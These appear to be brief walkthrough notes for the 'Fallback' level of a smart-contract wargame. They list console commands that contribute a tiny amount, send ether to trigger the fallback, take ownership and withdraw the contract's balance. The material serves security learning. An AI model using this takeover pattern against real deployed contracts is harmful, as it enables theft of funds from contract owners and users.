1. Fallback
-----------
* `await getBalance(contract.address)`
* [Send Ether](https://ethereum.stackexchange.com/a/53102)
  * `amount = toWei('0.00000001', 'ether')`
  * `await contract.contribute.sendTransaction(<function params>, <tx>)`
    * This will pay the `contribute` function.
    * `tx`: `{from:player, value:<amount>}`
    * Alternative takeover: pay more than the owner (1000 ether).
  * `await sendTransaction(<tx>)`
    * This will pay the fallback method.
    * `tx`: `{from:player, to:instance, value:<amount>}`
* `await contract.owner()`
* `await contract.withdraw()`
  * The solution was to first contribute, then pay the fallback.
  * Other solution: fallback in the `onlyOwner` modifier?
